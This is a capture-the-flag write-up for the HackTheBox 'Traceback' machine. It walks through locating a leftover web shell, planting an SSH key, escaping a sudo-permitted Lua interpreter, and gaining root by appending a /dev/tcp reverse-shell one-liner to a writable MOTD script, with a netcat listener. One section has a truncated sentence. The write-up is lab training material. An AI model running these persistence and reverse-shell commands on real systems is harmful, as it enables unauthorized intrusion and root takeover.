# Writeup - Traceback

## 1. Initial Scanning

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
```

Usual HTTP server and SSH server are available on recent versions.
No obvious exploits for the services are available out of the box.

A full TCP portscan (see `nmap_fulltcp`) reveals no other open ports.

## 2. Website Landing Page

The landing page show a defaced website owned by `Xh4H`, indicating that he/she left a backdoor for others to use. The source code of the page shows a comment saying

> `<!-- Some of the best web shells that you might need ;) -->`

indicating that there is a web shell left behind.

Which one in particular remains unknown at first, as there are seemingly no other documents on the web server, also no apparent directory listing.
`dirbuster` fails to find anything.

## 3. Finding the Shell

Googling `web shells` to find a couple popular reveals a [GitHub repository](https://github.com/TheBinitGhimire/Web-Shells) in the top results with the aforementioned message saying `Some of the best web shells that you might need`.
This is probably not a coincidence, therefore copying out the web shells listed in the repository into a file and requesting them at the target web site seems reasonable.

This yields `http://traceback/smevk.php` as valid address, indeed revealing a web shell. The default credentials mentioned in the GitHub repository work (`admin:admin`) and `webadmin` seems to be the username we operate as. However, its home directory doesn't contain the `user.txt` flag. On the way to the home directories, the user `sysadmin` and its respective home directory is discovered.

From here we can either place our own SSH public key in `webadmin`'s `authorized_keys` file or execute a reverse shell straight from the web shell (`netcat` is conveniently available).
SSH is convenient to use and persistent, so let's proceed with that.
Adding the key allows to log via SSH, so luckily `sshd`'s configuration doesn't prevent `webadmin`'s remote login.

## 4. Getting `sysadmin`

Instead of the `user.txt` flag, we find a `note.txt` indicating, that `webadmin` has access to an executable to "practice LUA", so probably some learning program or LUA interpreter.

`linenum` or `sudo -l` (see `linenum.log`) yields information about said command. Apparently `webadmin` is allowed to impersonate `sysadmin` when executing `/home/sysadmin/luvit`, which appears to be a LUA interpreter.

A quick lookup on how to execute system commands in LUA yields `os.execute("bash -i")`, which launches an interactive shell as user `sysadmin`, allowing a quick escape from the restricted `sudo` permission. In `sysadmin`'s home directory, the `user.txt` flag is found.

## 5. Attempting to escalate

`linenum.sh` shows `sudo 1.8` which is a couple (minor) versions behind the latest version. Besides that, no other interesting executables, etc. are found
in `linenum`'s log.

`searchsploit` yields 2 potential exploits for `sudo` on this or a later version. Both of them were unfortunately not successful.

### 5.1 pwfeedback

As the target machine neither has internet access nor a compiler installed, the files built by the exploit scrix

A promising exploit using a missing UID check to impersonate `root`.
Unfortunately it doesn't work, as `webadmin` has very restricted `sudo` privileges, which don't allow leveraging this vulnerability.

## 6. Escalating to `root`

Neither `sysadmin` nor `webadmin` seem to have other hints available. In addition, no `suid` executables are available either, so there should be some sort of application or misconfigured default software, we can utilize.
`.bash_history` yields a hint to `/etc/update-motd.d`, where the initial hacker (`Xh4H`) in this scenario modified the "Message of the Day" which appears upon login.

A closer look reveals that file is actually writeable by `sysadmin` (this is usually only writeable by `root`). Inserting code here causes it to be executed along with the other MotD scripts **as root**.

Inserting a reverse shell script into one of the script inside the `/etc/update-motd.d/` directory should provide us with a root shell upon next login.
However, we should pay attention to the exact script to prevent our reverse shell command from getting a regular login process stuck. Utilizing `nohup` and `&` should do the trick.

```bash
# Insert the reverse shell into the `00-header` file
echo 'nohup /bin/bash -i >& /dev/tcp/10.10.15.18/51337 0>&1 &' >> /etc/update-motd.d/00-header
```

Then just listen on our own machine for incoming connections:

```bash
nc -v -l -p 51337 -s 10.10.15.18
```

Upon re-connecting via SSH to `webadmin`, the reverse shell is triggered.
`root`'s home directory reveals the final flag `root.txt` (just like in other HackTheBox challenges).